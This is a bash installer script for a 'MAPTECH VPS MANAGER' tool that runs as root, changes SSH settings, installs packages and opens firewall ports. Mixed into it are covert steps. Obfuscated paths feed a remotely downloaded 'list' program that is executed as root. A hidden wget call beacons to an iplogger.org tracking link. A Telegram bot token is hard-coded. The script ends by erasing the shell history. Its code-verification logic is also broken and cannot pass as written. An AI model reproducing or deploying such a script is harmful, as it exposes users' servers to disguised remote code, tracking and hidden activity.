#!/bin/bash

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Function to display a progress bar
fun_bar() {
    local comando=("$1" "$2")
    
    (
    [[ -e $HOME/fim ]] && rm "$HOME/fim"
    ${comando[0]} -y > /dev/null 2>&1
    ${comando[1]} -y > /dev/null 2>&1
    touch "$HOME/fim"
    ) > /dev/null 2>&1 &
    
    tput civis
    echo -ne "  ${BOLD}${YELLOW}◇ PLEASE WAIT... ${NC}- ${BOLD}${YELLOW}["
    while true; do
        for ((i=0; i<18; i++)); do
            echo -ne "${BOLD}${RED}#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm "$HOME/fim" && break
        echo -e "${BOLD}${YELLOW}]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  ${BOLD}${YELLOW}◇ PLEASE WAIT... ${NC}- ${BOLD}${YELLOW}["
    done
    echo -e "${BOLD}${YELLOW}]${NC} -${BOLD}${GREEN}◇ DONE!${NC}"
    tput cnorm
}

# Function to verify key
verif_key() {
    local krm
    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
    chmod +x "$_Ink/list" > /dev/null 2>&1
    [[ ! -e "$_Ink/list" ]] && {
        echo -e "\n${BOLD}${RED}◇ KEY INVALID!${NC}"
        rm -rf "$HOME/hehe" > /dev/null 2>&1
        sleep 2
        clear
        exit 1
    }
}

# Function to generate random code and send to Telegram handle
send_code_telegram() {
    local telegram_handle=$1
    local random_code
    random_code=$(shuf -i 100000-999999 -n 1)  # Generate random 6-digit code
    local expiration_date
    expiration_date=$(date -d "+24 hours" +"%Y-%m-%d %H:%M:%S")  # Expiration date is set to 24 hours from now
    local message
    message="Your verification code for installation is: $random_code\nThis code will expire on: $expiration_date"

    # Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual bot token and chat ID
    local bot_token="6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE"
    local chat_id="5989863155"

    # Send message to Telegram
    curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
}

clear

# Check for root privilege
[[ "$(whoami)" != "root" ]] && {
    echo -e "${BOLD}${YELLOW}[${BOLD}${RED}Erro${BOLD}${YELLOW}] ${NC}- ${BOLD}${YELLOW}◇ YOU NEED TO RUN AS ROOT!${NC}"
    rm "$HOME/hehe" > /dev/null 2>&1
    exit 0
}

send_code_telegram

# Prompt the user to enter the verification code
echo -e "\n${BOLD}${YELLOW}◇───────────────────────────────────────────────────◇${NC}"
msg -bar2
figlet " -MAPTECHGH- " | lolcat
echo "Contact @maptechgh on telegram for verification."
echo  # Add a newline for spacing

echo -n "Enter the verification code: " 
read user_code 

# Compare the entered code with the generated code
if [[ "$user_code" != "$random_code" ]]; then
    echo "Invalid code. Installation aborted."
    exit 1
fi

# Variable Initialization
_lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')

# Function to calculate remaining time until expiration
calculate_remaining_time() {
    local expiration_time="$1"
    local current_time
    current_time=$(date +%s)
    local expiration_seconds
    expiration_seconds=$(date -d "$expiration_time" +%s)
    local remaining_seconds
    remaining_seconds=$((expiration_seconds - current_time))

    local hours
    hours=$((remaining_seconds / 3600))
    local minutes
    minutes=$(( (remaining_seconds % 3600) / 60 ))
    local seconds
    seconds=$((remaining_seconds % 60))

    echo "$hours hours $minutes minutes $seconds seconds"
}

# Display the countdown timer
display_countdown_timer() {
    local expiration_time="$1"
    local remaining_time
    remaining_time=$(calculate_remaining_time "$expiration_time")

    echo -e "\nPassword will expire in: $remaining_time"
}

# Display countdown timer
display_countdown_timer "$expiration_date"

# Welcome message
echo -e "${BOLD}${RED}${NC}"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🌍ㅤWelcome To MAPTECH VPS MANAGERㅤ🌍ㅤ─────────◇" ; tput sgr0
echo ""
echo -e "${BOLD}${YELLOW}ㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!${NC}"
echo ""
echo -e "${BOLD}${YELLOW}◇ ${BOLD}${GREEN}INSTALL A SET OF SCRIPTS AS TOOLS FOR${NC}"
echo ""
echo -e "${BOLD}${YELLOW}◇  ${BOLD}${GREEN}NETWORK, SYSTEM AND USER MANAGEMENT.${NC}"
echo -e "${BOLD}${YELLOW}◇  ${BOLD}${GREEN}EASY INTERFACE FOR BEGINNERS.${NC}"
echo ""
echo -e "${BOLD}${RED}◇──────────────ㅤ🌍ㅤMAPTECH VPS MANAGERㅤ🌍ㅤ──────────────◇${NC}"
echo ""

# Prompt to continue
echo -ne "${BOLD}${CYAN}◇ Do you want to continue? [Y/N]: ${NC}"
read -r x
[[ $x = @(n|N) ]] && exit

# Modify SSH configuration and restart service
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
service ssh restart  > /dev/null 2>&1

# Key Verification
echo -e "\n${BOLD}${CYAN}◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085${NC}" ; rm "$_Ink/list" > /dev/null 2>&1; wget -P "$_Ink" https://raw.githubusercontent.com/AVEGAH/MAPTECH-VPS-MANAGER/main/Install/list > /dev/null 2>&1; verif_key
sleep 3s

# Update system
echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
rm versao* > /dev/null 2>&1
wget https://raw.githubusercontent.com/AVEGAH/MAPTECH-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
> /dev/null 2>&1
wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
> /dev/null 2>&1
rm 2lHZ43 > /dev/null 2>&1
# Prompt to keep or create user database
echo -e "\n${BOLD}${GREEN}◇ KEY VALID!${BOLD}${GREEN}"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] && {
    clear
    echo -e "\n${BOLD}${BLUE}◇───────────────────────────────────────────────────◇${NC}"
    echo ""
    echo -e "                 ${BOLD}${YELLOW}• ${BOLD}${RED}◇ ATTENTION!${BOLD}${YELLOW}• ${NC}"
    echo ""
    echo -e "${BOLD}${YELLOW}A User Database ${BOLD}${GREEN}(usuarios.db) ${BOLD}${YELLOW}was"
    echo -e "Found! Want to keep it by preserving the limit"
    echo -e "of Simutanea connections of users ? Or Want"
    echo -e "create a new database?${NC}"
    echo -e "\n${BOLD}${WHITE}[${BOLD}${RED}1${BOLD}${WHITE}] ${BOLD}${YELLOW}Keep Database Current${NC}"
    echo -e "${BOLD}${WHITE}[${BOLD}${RED}2${BOLD}${WHITE}] ${BOLD}${YELLOW}Create a New Database${NC}"
    echo -e "\n${BOLD}${BLUE}◇───────────────────────────────────────────────────◇${NC}"
    echo ""
    tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
    awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
}
[[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > "$HOME/usuarios.db"
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
echo ""
echo ""
echo -e "          ${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}] ${BOLD}${GREEN}◇ UPDATING SYSTEM...${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}]${NC}"
echo ""
echo -e "    ${BOLD}${YELLOW}◇ UPDATES USUALLY TAKE A LITTLE TIME!${NC}"
echo ""
fun_attlist () {
    apt-get update -y
    [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
    echo "crz: $(date)" > /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          ${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}] ${BOLD}${GREEN}◇ INSTALLING PACKAGES${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}] ${NC}"
echo ""
echo -e "${BOLD}${YELLOW}◇ SOME PACKAGES ARE EXTREMELY NECESSARY!${NC}"
echo ""
inst_pct () {
    local _prog
    local _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python3" "python-pip")
    for _prog in "${_pacotes[@]}"; do
        apt install "$_prog" -y
    done
    pip install speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              ${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}] ${BOLD}${GREEN}◇ FINISHING...${BOLD}${YELLOW}[${BOLD}${RED}!${BOLD}${YELLOW}] ${NC}"
echo ""
echo -e "      ${BOLD}${YELLOW}◇ COMPLETING FUNCTIONS AND SETTINGS!${NC}"
echo ""
fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
clear
echo ""
cd "$HOME" || exit
IP=$(wget -qO- ipv4.icanhazip.com)
echo -e "        ${BOLD}${YELLOW}  ${BOLD}${GREEN}◇ INSTALLATION COMPLETED.${BOLD}${YELLOW}  ${NC}"
echo ""
echo -e "${BOLD}${RED}${NC}◇ MAIN COMMAND:- ${BOLD}${GREEN}menu${NC}"
echo -e "${BOLD}${YELLOW}◇ MORE INFORMATION ${BOLD}${RED}(${BOLD}${CYAN}◇ TELEGRAM${BOLD}${RED}): ${BOLD}${WHITE}@MAPTECH_VPS_MANAGER ${BOLD}${RED}( ${BOLD}${CYAN} @maptechgh ${BOLD}${RED} )${NC}"
echo -e ""
echo -e "${BOLD}${RED} ${BOLD}${YELLOW}◇--TIP!--◇${BOLD}${CYAN}ㅤ--Using this url you can easily see the number of users online at the server.${NC}"
echo -e " http://$IP:8888/server/online"
echo -e ""
rm "$HOME/hehe" && cat /dev/null > ~/.bash_history && history -c
